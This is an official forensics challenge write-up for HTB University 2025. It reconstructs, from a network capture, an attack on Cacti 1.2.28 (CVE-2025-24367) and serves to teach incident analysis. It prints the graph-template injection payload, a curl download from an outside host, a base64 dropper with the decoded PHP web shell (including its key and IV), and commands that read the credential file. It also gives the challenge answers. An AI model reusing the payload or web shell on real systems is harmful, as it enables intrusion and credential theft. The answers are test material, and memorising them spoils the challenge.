# htb-university-2025_A Trail of Snow and Deception

<img src="../../assets/banner.png" style="zoom: 80%;" align=center />

<img src="../../assets/htb.png" style="zoom: 80%;" align='left' /><font size="5">A Trail of Snow and Deception</font>

  5<sup>th</sup> 12 2025

  Prepared By: Nauten

  Challenge Author: Nauten

  Difficulty: <font color=green>Easy</font>

  Classification: Official






# Synopsis

- A Trail of Snow and Deception is an easy-level forensics challenge that involves analyzing a provided network capture file to gather key details about attack, answer several questions, and ultimately retrieve the flag.


## Description

- Oliver Mirth, Tinselwick's forensic expert, crouched by the glowing lantern post, tracing the shimmerdust trail with a gloved finger. It led into the snowdrifts, then disappeared, no footprints, no sign of a struggle.

  He glanced up at the flickering Snowglobe atop Sprucetop Tower, its light wavering like a fading star.
  
  "Someone’s been tampering with the magic," Oliver murmured. "But why?"
  
  He straightened, eyes narrowing. The trail might be gone, but the mystery was just beginning.
  
  Can Oliver uncover the secret behind the fading glow?

## Skills Required

- Familiarity with analyzing network traffic
- Familiarity with analyzing PHP code
- Understanding the logic behind unknown attack vectors

## Skills Learned

- Event reconstruction and attack context analysis
- Detection of custom attack techniques

# Enumeration

The following file is provided:

- `capture.pcap` contains HTTP network traffic

Analyzing network traffic it's possible to see evidence related to a directory enumeration attack.

To filter only traffic with a successful HTTP response and list all used endpoints, use:

```bash
$ tshark -2 -r capture.pcap -Y "http.response.code == 200" -T fields -e http.request.uri | uniq 
/
/cacti/
/cacti/graph_view.php
/cacti/host.php
/cacti/graph_view.php?action=get_node&tree_id=0&id=%23
/cacti/sites.php
/cacti/tree.php
/cacti/graphs.php
/cacti/data_sources.php
/cacti/aggregate_graphs.php
/cacti/pollers.php
/cacti/about.php
/cacti/cdef.php
/cacti/vdef.php
/cacti/gprint_presets.php
/cacti/settings.php
/cacti/user_admin.php
/cacti/user_group_admin.php
/cacti/user_domains.php
/cacti/
/cacti/index.php
/cacti/graph_templates.php?filter=Unix%20-%20Logged%20in%20Users&rows=-1&has_graphs=false
/cacti/graph_templates.php?action=template_edit&id=226
/cacti/graph_templates.php?header=false&action=template_edit&id=226
/cacti/graph_json.php?rra_id=0&local_graph_id=3&graph_start=1761683272&graph_end=1761769672&graph_height=200&graph_width=700
/bash
/cacti/JWUA5a1yj.php
/cacti/graph_templates.php?action=template_edit&id=226
/cacti/graph_templates.php?header=false&action=template_edit&id=226
/cacti/graph_json.php?rra_id=0&local_graph_id=3&graph_start=1761683272&graph_end=1761769672&graph_height=200&graph_width=700
/cacti/ornF85gfQ.php
/cacti/pollers.php?header=false
/cacti/f54Avbg4.php?q=aWQ=
/cacti/f54Avbg4.php?q=aG9zdG5hbWU=
/cacti/f54Avbg4.php?q=cHdk
/cacti/f54Avbg4.php?q=bHMgLWxh
/cacti/f54Avbg4.php?q=bHMgLWxhIGluY2x1ZGUv
/cacti/f54Avbg4.php?q=Y2F0IGluY2x1ZGUvY29uZmlnLnBocA==
```

To list only POST requests:

```bash
$ tshark -2 -r capture.pcap -Y "http.request.method == POST" -T fields -e http.request.uri | uniq 
/cacti/index.php
/cacti/graph_templates.php?header=false
```

All requests are related to "Cacti" software:

> Cacti provides a robust and extensible operational monitoring and fault management framework for users around the world. Is also a complete network graphing solution designed to harness the power of RRDTool's data storage and graphing functionality. 

With all these elements it's possible to conduct deeper analysis and reply to questions.

# Solution

**Note for HTB:**

- for a better user experience, it's suggested to allow the docker instance to accept **case-insensitive** replies.
- "->" is how to get the values so it's not intended to show those description to users

------

### [1/7] What is the Cacti version in use? (e.g. 7.1.0)

The answer to this question can be obtained in different ways.

On Wireshark apply `frame contains "version"`filter and follow the HTTP stream of one found packet.
Search again (CTRL + F) in the window the string "version".

In one of the HTTP responses it's possible to find data to reply to the answer:

```html
<div class='versionInfo'>Version 1.2.28 | (c) 2004-2025 - The Cacti Group</div>
```

* Answer: `1.2.28`

------

### [2/7] What is the set of credentials used to log in to the instance? (e.g., username:password)

Looking at POST requests obtained before:

```
/cacti/index.php
/cacti/graph_templates.php?header=false
```

Focusing on this one:

```http
POST /cacti/index.php HTTP/1.1
Host: monitor.tinselwick.htb
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: Cacti=jn2tiefo4iqeer4up0br8p9sle
Content-Length: 145
Content-Type: application/x-www-form-urlencoded

__csrf_magic=sid%3A31f2e900cfdebb14d4e31670308d7efb2650f672%2C1764692067&action=login&login_username=marnie.thistlewhip&login_password=Z4ZP_8QzKA
```

* Answer: `marnie.thistlewhip:Z4ZP_8QzKA`

------

### [3/7] Three malicious PHP files are involved in the attack. In order of appearance in the network stream, what are they? (e.g., file1.php,file2.php,file3.php)

Looking at previously found requests it's possible to notice 3 suspicious files:

```
/cacti/JWUA5a1yj.php
/cacti/ornF85gfQ.php
/cacti/f54Avbg4.php
```


* Answer: `JWUA5a1yj.php,ornF85gfQ.php,f54Avbg4.php`

------

### [4/7] What file gets downloaded using curl during exploitation process? (e.g. filename)

On Wireshark apply `frame contains "curl"` filter and follow the stream of the first found packet to find this request:

```http
POST /cacti/graph_templates.php?header=false HTTP/1.1
Host: monitor.tinselwick.htb
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: Cacti=jn2tiefo4iqeer4up0br8p9sle
Content-Length: 895
Content-Type: application/x-www-form-urlencoded

__csrf_magic=sid%3A31f2e900cfdebb14d4e31670308d7efb2650f672%2C1764692067&name=Unix+-+Logged+in+Users&graph_template_id=226&graph_template_graph_id=226&save_component_template=1&title=%7Chost_description%7C+-+Logged+in+Users&vertical_label=percent&image_format_id=3&height=200&width=700&base_value=1000&slope_mode=on&auto_scale=on&auto_scale_opts=2&auto_scale_rigid=on&upper_limit=100&lower_limit=0&unit_value=&unit_exponent_value=&unit_length=&right_axis=&right_axis_label=XXX%0Acreate+my.rrd+--step+300+DS%3Atemp%3AGAUGE%3A600%3A-273%3A5000+RRA%3AAVERAGE%3A0.5%3A1%3A1200%0Agraph+JWUA5a1yj.php+-s+now+-a+CSV+DEF%3Aout%3Dmy.rrd%3Atemp%3AAVERAGE+LINE1%3Aout%3A%3C%3F%3D%60curl%5Cx2010.10.0.1%2Fbash%5Cx20-o%5Cx20bash%60%3B%3F%3E%0A&right_axis_format=0&right_axis_formatter=0&left_axis_formatter=0&auto_padding=on&tab_width=30&legend_position=0&legend_direction=0&rrdtool_version=1.7.2&action=save
```

Apply URL-decode on POST content:

```http
__csrf_magic=sid:31f2e900cfdebb14d4e31670308d7efb2650f672,1764692067&name=Unix+-+Logged+in+Users&graph_template_id=226&graph_template_graph_id=226&save_component_template=1&title=|host_description|+-+Logged+in+Users&vertical_label=percent&image_format_id=3&height=200&width=700&base_value=1000&slope_mode=on&auto_scale=on&auto_scale_opts=2&auto_scale_rigid=on&upper_limit=100&lower_limit=0&unit_value=&unit_exponent_value=&unit_length=&right_axis=&right_axis_label=XXX
create+my.rrd+--step+300+DS:temp:GAUGE:600:-273:5000+RRA:AVERAGE:0.5:1:1200
graph+JWUA5a1yj.php+-s+now+-a+CSV+DEF:out=my.rrd:temp:AVERAGE+LINE1:out:<?=`curl\x2010.10.0.1/bash\x20-o\x20bash`;?>
&right_axis_format=0&right_axis_formatter=0&left_axis_formatter=0&auto_padding=on&tab_width=30&legend_position=0&legend_direction=0&rrdtool_version=1.7.2&action=save
```

The payload is:

```
curl\x2010.10.0.1/bash\x20-o\x20bash
```

So the filename that gets downloaded is "bash" and saved with the same name on the remote server.

- Answer: `bash`

------

### [5/7] What is the name of the variable in one of the three malicious PHP files that stores the result of the executed system command? (e.g., $q5ghsA)

On Wireshark, File -> Export Objects -> HTTP -> bash

The file content is:

```bash
#!/bin/bash
echo PD9waHAgJEE0Z1ZhR3pIID0gImtGOTJzTDBwUXc4ZVR6MTdhQjR4TmM5VlVtM3lIZDZHIjskQTRnVmFSbVYgPSAicFo3cVIxdEx3OERmM1hiSyI7JEE0Z1ZhWHpZID0gYmFzZTY0X2RlY29kZSgkX0dFVFsicSJdKTskYTU0dmFnID0gc2hlbGxfZXhlYygkQTRnVmFYelkpOyRBNGdWYVFkRiA9IG9wZW5zc2xfZW5jcnlwdCgkYTU0dmFnLCJBRVMtMjU2LUNCQyIsJEE0Z1ZhR3pILE9QRU5TU0xfUkFXX0RBVEEsJEE0Z1ZhUm1WKTtlY2hvIGJhc2U2NF9lbmNvZGUoJEE0Z1ZhUWRGKTsgPz4=|base64 --decode > f54Avbg4.php
```

After applying base64 decode operation:

```php
<?php $A4gVaGzH = "kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G";$A4gVaRmV = "pZ7qR1tLw8Df3XbK";$A4gVaXzY = base64_decode($_GET["q"]);$a54vag = shell_exec($A4gVaXzY);$A4gVaQdF = openssl_encrypt($a54vag,"AES-256-CBC",$A4gVaGzH,OPENSSL_RAW_DATA,$A4gVaRmV);echo base64_encode($A4gVaQdF); ?>
```

This is the line to focus on:

```php
$a54vag = shell_exec($A4gVaXzY);
```

The output of executed command gets stored inside `$a54vag` variable.

- Answer: `$a54vag`


------

### [6/7] What is the system machine hostname? (e.g. server01)

At this point it's clear that the final file of the attack is `f54Avbg4.php` and it's used to execute command on the system using parameter `q` in GET request, so focus on these requests:

```
/cacti/f54Avbg4.php?q=aWQ=
/cacti/f54Avbg4.php?q=aG9zdG5hbWU=
/cacti/f54Avbg4.php?q=cHdk
/cacti/f54Avbg4.php?q=bHMgLWxh
/cacti/f54Avbg4.php?q=bHMgLWxhIGluY2x1ZGUv
/cacti/f54Avbg4.php?q=Y2F0IGluY2x1ZGUvY29uZmlnLnBocA==
```

Applying base64 decode on `q` values:

```
id
hostname
pwd
ls -la
ls -la include/
cat include/config.php
```

Apply the Wireshark filter `http.request.uri contains "f54Avbg4"` and extract all encrypted strings contained in the HTTP responses. 

These are encrypted using the previously identified PHP code that uses AES-256-CBC, so apply the corresponding recipes in CyberChef, providing the Key and IV values accordingly:

![](assets/1.png)

Looking at the second executed command "hostname", the decoded output is `tinselmon01`.

- Answer: `tinselmon01`


------

### [7/7] What is the database password used by Cacti? (e.g. Password123)

Using the same principle decrypt the last executed command in the session, this returns the Cacti database configuration file with this part:

```php
$database_default  = 'cacti';
$database_hostname = 'db';
$database_username = 'cacti';
$database_password = 'zqvyh2fLgyhZp9KV';
```

- Answer: `zqvyh2fLgyhZp9KV`


------

### [Extra] What is the CVE assigned to this Cacti vulnerability? (e.g. CVE-2025-12345)

Looking for recent CVE related to Cacti version 1.2.28 leads to [CVE-2025-24367](https://www.cve.org/CVERecord?id=CVE-2025-24367)

Description of the vulnerability:

> Cacti is an open  source performance and fault management framework. An authenticated  Cacti user can abuse graph creation and graph template functionality to  create arbitrary PHP scripts in the web root of the application, leading to remote code execution on the server. This vulnerability is fixed in  1.2.29.

- Answer: `CVE-2025-24367`




